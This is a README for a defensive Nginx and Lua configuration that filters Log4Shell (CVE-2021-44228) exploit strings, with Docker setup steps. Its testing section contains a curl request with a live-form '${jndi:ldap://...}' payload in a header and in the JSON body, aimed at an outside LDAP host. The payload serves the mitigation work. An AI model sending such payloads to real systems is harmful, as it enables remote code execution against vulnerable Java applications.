
# nginx-lua
This repository contains the configuration for the mitigation of Log4j vulnerabilities in the JAVA applications. Nginx, with the help of lua module, will prevent the attacker to access vulnerable JAVA application.
Special thanks to [John H Patton
](https://johnhpatton.medium.com/) for the motivation to extend the solution he wrote to mitigate the Log4j vulnerability.


## Description
This implementation will provide a quick fix for the vulnerability [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228). By following this guide, we can mitigate the risk of remote code execution with the help of Nginx + lua module. After this implementation, each request will be inspected by Nginx and if the request has exploit to remotely execute the code in either its header or in the body, the request will be dropped and won't make its way to the internal application.


## Requirements
1. Expertflow has built Debian-based Nginx image with lua module build-in. Just pull the docker image of nginx from the [Expertflow Dockerhub registry](https://hub.docker.com/r/expertflow/nginx-lua/tags).
2. Update the `nginx.conf` file
3. Clone and mount the `nginx-lua.conf` `lua.conf`, and `cve_2021_44228.lua` files to your nginx container.

We assume that the nginx is deployed in Docker throughout the document.




## Implementation Steps
1. Clone and copy the `nginx-lua.conf`, `https-lua.conf`, `lua.conf`, and `cve_2021_44228.lua` ,  in the `/path/to/nginx_volume_mount/`. 
For example if you have deployed nginx in Docker then there must be a section present called `Volumes:` in your docker-compose. For example:
```
volumes:
      - /path/to/nginx_volume_mount/https.conf:/etc/nginx/conf.d/https.conf
```

This is mounting a custom `https.conf` file to the build-in nginx `https.conf` file present under the directory: `/etc/nginx/conf.d/` in nginx container.

2. Now we need to modify `https.conf`. Update the `/path/to/nginx_volume_mount/https.conf` file by adding the following code in `https.conf`

```
include /etc/nginx/https-lua.conf
```



3. Now we need to update the `docker-compose.yml` file of the nignx. 
- Update the `image:` entry with the `expertflow/nginx-lua:debian-1.21.4`
- Navigate to the `volume:` section and mount these files to docker container by adding the following code:
```
    volumes:
      - /path/to/nginx_volume_mount/https.conf:/etc/nginx/conf.d/https.conf
      - /path/to/nginx_volume_mount/https-lua.conf:/etc/nginx/https-lua.conf
      - /path/to/nginx_volume_mount/nginx-lua.conf:/etc/nginx/nginx.conf
      - /path/to/nginx_volume_mount/cve_2021_44228.lua:/usr/local/lib/lua/cve_2021_44228.lua
      - /path/to/nginx_volume_mount/lua.conf:/etc/nginx/conf.d/lua.conf
```
4. Now just remove the nginx container and start it again. 

### Testing
We can now test our implementation whether it's blocking the exploit in the request or not. To test it, send the following request with the exploit present in the header and body with `curl`. Just replace the string `<FQDN>` with your FQDN.
```
curl --location --request POST 'https://<FQDN>/uri' \
--header 'efheader: ${jndi:ldap://8.8.4.4:1111/RCE/Command}' \
--header 'Content-Type: application/json' \
--data '{
    "messages": [{
        "from": "333",
        "contacts": "Jon Doe",
        "text": {
            "body": "${jndi:ldap://8.8.4.4:1111/RCE/Command}"
        }
    }]
}'
```
This will show you the following response which indicates that the configurations are working in perfect manner.
```
 Expertflow Log4J Forbidden
```
